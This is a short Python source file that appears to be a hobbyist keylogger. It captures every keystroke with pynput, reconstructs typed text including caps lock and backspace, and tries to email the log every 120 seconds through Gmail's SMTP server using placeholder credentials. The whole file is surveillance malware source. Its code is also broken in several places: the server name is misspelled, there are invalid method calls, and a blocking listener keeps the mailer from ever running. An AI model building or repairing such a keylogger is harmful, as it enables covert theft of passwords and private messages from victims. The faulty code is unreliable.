import pynput.keyboard as keyboard
import threading 

import smtplib 

# def grab_key(key):
#     print(key)

# listener=keyboard.Listener(on_press=grab_key)

# with listener:
#     listener.join()

'''
log=""
def grab_key(key):
    global log
    try:
        log=log+str(key.char)
    except Exception:

        log+=" " + str(key)+ " "

    print(log)

listener=keyboard.Listener(on_press=grab_key)


with listener:
    listener.join()

'''

log=""
caps=False
count=0
def grab_key(key):
    global log,caps,count
    try:
        if caps:
            log=log+str(key.char).swapcase()
        else:
             #log+=" " + str(key)+ " "
             log=log+str(key.char)
 
    except Exception:
        if str(key) =='Key.space':
            log+=" "

        elif str(key)=='Key.shift':
            pass
        elif str(key)=='Key.backspace':
            log=log[:-1]
        elif str(key)=='Key.caps_lock':
            caps=True
            count+=1
            if count>1:
                count=0
                caps=False

        elif str(key)=='Key.enter':
            log+='\n'
        else:
            log+=" " + str(key)+ " "

    print(log)
listener=keyboard.Listener(on_press=grab_key) 
with listener:
    listener.join()

email ,pssd='ajsmdenncdjd.com','sjdsnkdnsj'   
def report():
    global log
    mail(email,pssd,log)
    log=""
    timer=threading.Timer(120,report)
    timer.start()

listener=keyboard.Listener(on_press=grab_key)

with listener:
    report()
    listener.join()

def mail(eamil,pssd,mssg):
    server=smtplib.SMTP("smpt.gmail.com",587)
    server=starttls()
    server.login(eamil,pssd)
    server.send(email,email,mssg)
    server.quit()

